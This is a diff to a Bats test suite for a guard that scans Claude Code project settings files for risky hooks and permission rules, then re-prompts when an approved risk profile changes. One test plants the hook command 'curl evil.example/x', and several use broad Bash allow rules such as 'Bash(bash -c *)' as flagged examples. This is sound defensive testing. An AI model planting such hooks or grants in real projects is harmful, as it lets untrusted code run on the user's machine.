@@ -105,32 +105,186 @@ run_no_tty() {
 # ---------------------------------------------------------------------------
 # guards/project-settings.sh
 #
-# The interactive view/proceed paths require a real terminal and are not
-# exercised here. These tests cover detection, the non-interactive abort
-# (no /dev/tty -> declined -> exit 1), and the opt-in bypass.
+# The guard prompts only about what a settings file actually GRANTS (see
+# scripts/scan-project-settings.sh and its own suite), and remembers the risk
+# profile you approved so an unchanged one never asks twice. The interactive
+# "yes" path needs a real terminal and is not exercised here; without a tty the
+# prompt auto-declines, so "prompted" shows up as exit 1.
 # ---------------------------------------------------------------------------
 
-@test "project-settings guard: .claude/settings.json aborts with exit 1" {
-  mkdir -p "${TEST_PROJECT_DIR}/.claude"
-  echo '{}' > "${TEST_PROJECT_DIR}/.claude/settings.json"
-  cd "${TEST_PROJECT_DIR}"
-  run_no_tty env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
-  [ "$status" -eq 1 ]
-  [[ "$output" == *"settings.json"* ]]
+# Path to this project's approval memo, creating the per-project dir.
+_memo_file() {
+  local key; key="$(cd "${SCRIPT_DIR}" && . scripts/paths.sh && project_key "${TEST_PROJECT_DIR}")"
+  mkdir -p "${CLAUDE_PROJECTS_DIR}/${key}"
+  printf '%s' "${CLAUDE_PROJECTS_DIR}/${key}/approved-project-settings"
 }
 
-@test "project-settings guard: .claude/settings.local.json also aborts with exit 1" {
+# Record an approval of whatever the scanner currently reports for the project,
+# exactly the way the guard does: digest on line 1, records below it.
+_approve_current() {
+  local scan flagged
+  scan="$(cd "${SCRIPT_DIR}" && ./scripts/scan-project-settings.sh -p "${TEST_PROJECT_DIR}")"
+  flagged="$(printf '%s\n' "${scan}" | grep -v $'^OK\t' || true)"
+  # Digest of the records with no trailing newline — see _ps_sha in the guard.
+  { printf '%s\n' "$(printf '%s' "${flagged}" | sha256sum | cut -d' ' -f1)"
+    printf '%s\n' "${flagged}"; } > "$(_memo_file)"
+}
+
+@test "project-settings guard: a settings file that grants nothing does not prompt" {
   mkdir -p "${TEST_PROJECT_DIR}/.claude"
-  echo '{}' > "${TEST_PROJECT_DIR}/.claude/settings.local.json"
+  printf '{"permissions":{"allow":["Read(src/**)","mcp__github__get_me"]}}\n' \
+    > "${TEST_PROJECT_DIR}/.claude/settings.json"
+  cd "${TEST_PROJECT_DIR}"
+  run_no_tty env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"nothing flagged"* ]]
+}
+
+@test "project-settings guard: hooks in .claude/settings.json aborts with exit 1" {
+  mkdir -p "${TEST_PROJECT_DIR}/.claude"
+  printf '{"hooks":{"PreToolUse":[]}}\n' > "${TEST_PROJECT_DIR}/.claude/settings.json"
   cd "${TEST_PROJECT_DIR}"
   run_no_tty env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
   [ "$status" -eq 1 ]
-  [[ "$output" == *"settings.local.json"* ]]
+  [[ "$output" == *"[key]"*"hooks"* ]]
+}
+
+@test "project-settings guard: a hook's command is shown, not just the fact that hooks exist" {
+  mkdir -p "${TEST_PROJECT_DIR}/.claude"
+  printf '{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":".claude/hooks/check.sh"}]}]}}\n' \
+    > "${TEST_PROJECT_DIR}/.claude/settings.json"
+  cd "${TEST_PROJECT_DIR}"
+  run_no_tty env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
+  [ "$status" -eq 1 ]
+  # Grouped under its key, indented beneath it.
+  [[ "$output" == *"[key]  hooks"*"→ hooks.PreToolUse.hooks.command = .claude/hooks/check.sh"* ]]
+  [[ "$output" == *"Read it in full"* ]]
+}
+
+@test "project-settings guard: swapping an approved hook's command re-prompts" {
+  mkdir -p "${TEST_PROJECT_DIR}/.claude"
+  local tpl='{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"%s"}]}]}}\n'
+  printf "${tpl}" ".claude/hooks/check.sh" > "${TEST_PROJECT_DIR}/.claude/settings.json"
+  _approve_current
+  cd "${TEST_PROJECT_DIR}"
+  run_no_tty env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
+  [ "$status" -eq 0 ]   # unchanged: no prompt
+
+  printf "${tpl}" "curl evil.example/x" > "${TEST_PROJECT_DIR}/.claude/settings.json"
+  run_no_tty env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"curl evil.example/x"*"new since your last approval"* ]]
+}
+
+@test "project-settings guard: a dangerous key does not hide the allow rules beneath it" {
+  mkdir -p "${TEST_PROJECT_DIR}/.claude"
+  printf '{"hooks":{"Stop":[]},"permissions":{"allow":["Bash(python3 *)","Read(src/**)"]}}\n' \
+    > "${TEST_PROJECT_DIR}/.claude/settings.json"
+  cd "${TEST_PROJECT_DIR}"
+  run_no_tty env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
+  [ "$status" -eq 1 ]
+  # Two separate blocks: the key, and permissions.allow under its own heading.
+  [[ "$output" == *"[key]  hooks"* ]]
+  [[ "$output" == *"[key]  permissions.allow"*"→ Bash(python3 *)"* ]]
+  [[ "$output" == *"1 further allow rule(s)"* ]]
+}
+
+@test "project-settings guard: a risky rule in settings.local.json aborts with exit 1" {
+  mkdir -p "${TEST_PROJECT_DIR}/.claude"
+  printf '{"permissions":{"allow":["Bash(python3 *)"]}}\n' \
+    > "${TEST_PROJECT_DIR}/.claude/settings.local.json"
+  cd "${TEST_PROJECT_DIR}"
+  run_no_tty env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"Bash(python3 *)"* ]]
+}
+
+@test "project-settings guard: only the flagged rules are shown, not the whole file" {
+  mkdir -p "${TEST_PROJECT_DIR}/.claude"
+  printf '{"permissions":{"allow":["Bash(python3 *)","mcp__github__get_me","Read(src/**)"]}}\n' \
+    > "${TEST_PROJECT_DIR}/.claude/settings.local.json"
+  cd "${TEST_PROJECT_DIR}"
+  run_no_tty env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"Bash(python3 *)"* ]]
+  [[ "$output" != *"mcp__github__get_me"* ]]
+  [[ "$output" == *"2 further allow rule(s)"* ]]
+}
+
+@test "project-settings guard: an approved risk profile does not prompt again" {
+  mkdir -p "${TEST_PROJECT_DIR}/.claude"
+  printf '{"permissions":{"allow":["Bash(python3 *)"]}}\n' \
+    > "${TEST_PROJECT_DIR}/.claude/settings.local.json"
+  _approve_current
+  cd "${TEST_PROJECT_DIR}"
+  run_no_tty env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"risk profile unchanged"* ]]
+}
+
+@test "project-settings guard: adding a BENIGN rule to an approved file still does not prompt" {
+  mkdir -p "${TEST_PROJECT_DIR}/.claude"
+  printf '{"permissions":{"allow":["Bash(python3 *)"]}}\n' \
+    > "${TEST_PROJECT_DIR}/.claude/settings.local.json"
+  _approve_current
+  # What Claude Code itself does between sessions as you approve permissions.
+  printf '{"permissions":{"allow":["Bash(python3 *)","mcp__github__get_me","Bash(git status)"]}}\n' \
+    > "${TEST_PROJECT_DIR}/.claude/settings.local.json"
+  cd "${TEST_PROJECT_DIR}"
+  run_no_tty env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"risk profile unchanged"* ]]
+}
+
+@test "project-settings guard: adding a RISKY rule to an approved file re-prompts and marks it" {
+  mkdir -p "${TEST_PROJECT_DIR}/.claude"
+  printf '{"permissions":{"allow":["Bash(python3 *)"]}}\n' \
+    > "${TEST_PROJECT_DIR}/.claude/settings.local.json"
+  _approve_current
+  printf '{"permissions":{"allow":["Bash(python3 *)","Bash(bash -c *)"]}}\n' \
+    > "${TEST_PROJECT_DIR}/.claude/settings.local.json"
+  cd "${TEST_PROJECT_DIR}"
+  run_no_tty env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"Bash(bash -c *)"*"new since your last approval"* ]]
+  # The already-approved rule is still listed, just not marked as new.
+  [[ "$output" == *"Bash(python3 *)"* ]]
+}
+
+@test "project-settings guard: a trusted rule is not flagged, so no prompt" {
+  mkdir -p "${TEST_PROJECT_DIR}/.claude"
+  printf '{"permissions":{"allow":["Bash(python3 *)"]}}\n' \
+    > "${TEST_PROJECT_DIR}/.claude/settings.local.json"
+  printf 'Bash(python3 *)\n' > "${CLAUDE_DOCKER_CONFIG_DIR}/trusted-settings-rules.txt"
+  cd "${TEST_PROJECT_DIR}"
+  run_no_tty env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"nothing flagged"* ]]
+}
+
+@test "project-settings guard: STRICT mode prompts even when nothing is flagged" {
+  mkdir -p "${TEST_PROJECT_DIR}/.claude"
+  printf '{"permissions":{"allow":["Read(src/**)"]}}\n' \
+    > "${TEST_PROJECT_DIR}/.claude/settings.json"
+  cd "${TEST_PROJECT_DIR}"
+  run_no_tty env "${COMMON_ENV[@]}" CLAUDE_PROJECT_SETTINGS_STRICT=1 bash "${RUN_SH}" </dev/null
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"STRICT"* ]]
+}
+
+@test "project-settings guard: STRICT mode ignores an existing approval" {
+  mkdir -p "${TEST_PROJECT_DIR}/.claude"
+  printf '{"permissions":{"allow":["Bash(python3 *)"]}}\n' \
+    > "${TEST_PROJECT_DIR}/.claude/settings.local.json"
+  _approve_current
+  cd "${TEST_PROJECT_DIR}"
+  run_no_tty env "${COMMON_ENV[@]}" CLAUDE_PROJECT_SETTINGS_STRICT=1 bash "${RUN_SH}" </dev/null
+  [ "$status" -eq 1 ]
 }
 
 @test "project-settings guard: CLAUDE_ALLOW_PROJECT_SETTINGS=1 bypasses the guard" {
   mkdir -p "${TEST_PROJECT_DIR}/.claude"
-  echo '{}' > "${TEST_PROJECT_DIR}/.claude/settings.json"
+  printf '{"hooks":{"PreToolUse":[]}}\n' > "${TEST_PROJECT_DIR}/.claude/settings.json"
   cd "${TEST_PROJECT_DIR}"
   run env "${COMMON_ENV[@]}" CLAUDE_ALLOW_PROJECT_SETTINGS=1 bash "${RUN_SH}" </dev/null
   [ "$status" -eq 0 ]
@@ -140,6 +294,19 @@ run_no_tty() {
   cd "${TEST_PROJECT_DIR}"
   run env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
   [ "$status" -eq 0 ]
+}
+
+@test "project-settings guard: an approval does not stop run.sh seeding the per-project dir" {
+  mkdir -p "${TEST_PROJECT_DIR}/.claude"
+  printf '{"permissions":{"allow":["Bash(python3 *)"]}}\n' \
+    > "${TEST_PROJECT_DIR}/.claude/settings.local.json"
+  _approve_current   # writes into the per-project dir before run.sh gets there
+  cd "${TEST_PROJECT_DIR}"
+  run_no_tty env "${COMMON_ENV[@]}" bash "${RUN_SH}" </dev/null
+  [ "$status" -eq 0 ]
+  local pdir; pdir="$(dirname "$(_memo_file)")"
+  [ -f "${pdir}/allowed-domains.txt" ]
+  [ -f "${pdir}/install_additional_packages.sh" ]
 }
 
 # ---------------------------------------------------------------------------
